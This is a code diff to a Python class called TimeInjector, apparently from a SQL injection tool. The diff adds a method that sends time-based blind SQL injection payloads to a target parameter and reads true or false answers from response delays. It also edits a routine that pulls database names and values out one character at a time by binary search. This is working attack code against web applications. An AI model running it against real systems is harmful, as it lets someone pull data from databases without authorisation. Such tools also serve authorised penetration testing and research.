@@ -50,6 +50,30 @@ class TimeInjector:
 
         return self.analyzer.is_delayed(r_normal, r_sleep, self.sleep)
 
+    def get_bool(
+        self,
+        param: str,
+        ctx: InjectionContext,
+        expression: str,
+    ) -> str:
+        """
+        Get the boolean value returned by the SQL query
+        """
+
+        # Baseline request containing a condition that does not trigger a delay.
+        r_baseline = self.requester.send(
+            {param: f"{ctx.prefix}AND IF(1=2,{self.sleep_expression},0){ctx.suffix}"}
+        )
+
+        payload = f"{ctx.prefix}AND IF({expression}= 1,{self.sleep_expression},0){ctx.suffix}"
+
+        response = self.requester.send({param: payload})
+
+        # A significant increase in response time means that the expression evaluated to true.
+        if self.analyzer.is_delayed(r_baseline, response, self.sleep):
+            return 'True'
+        return 'False'
+
     def get_number(
         self,
         param: str,
@@ -96,17 +120,17 @@ class TimeInjector:
         param: str,
         ctx: InjectionContext,
         expression: str,
-        expr_name_len: int,
+        string_len: int,
     ) -> str:
         """
-        Return a database element's name using time-based blind SQLi.
+        Return a database element's name or value using time-based blind SQLi.
 
         Each character is found with binary search over the printable ASCII
         range. A database delay is used to determine whether the tested
         ASCII value is greater than the current midpoint.
         """
 
-        expr_name = ""
+        result = ""
 
         # Get the database-specific expression to handle characters
         char_expression = fingerprints[database_engine.lower()].char
@@ -119,7 +143,7 @@ class TimeInjector:
             {param: f"{ctx.prefix}AND IF(1=2,{self.sleep_expression},0){ctx.suffix}"}
         )
 
-        for digit in range(1, expr_name_len + 1):
+        for digit in range(1, string_len + 1):
             # Printable ASCII characters: SPACE (32) through TILDE (126).
             low = 32
             high = 126
@@ -147,9 +171,9 @@ class TimeInjector:
                 else:
                     high = mid
 
-            expr_name += chr(low)
+            result += chr(low)
 
-        return expr_name
+        return result
 
     def get_string_chars_at_index(
         self,
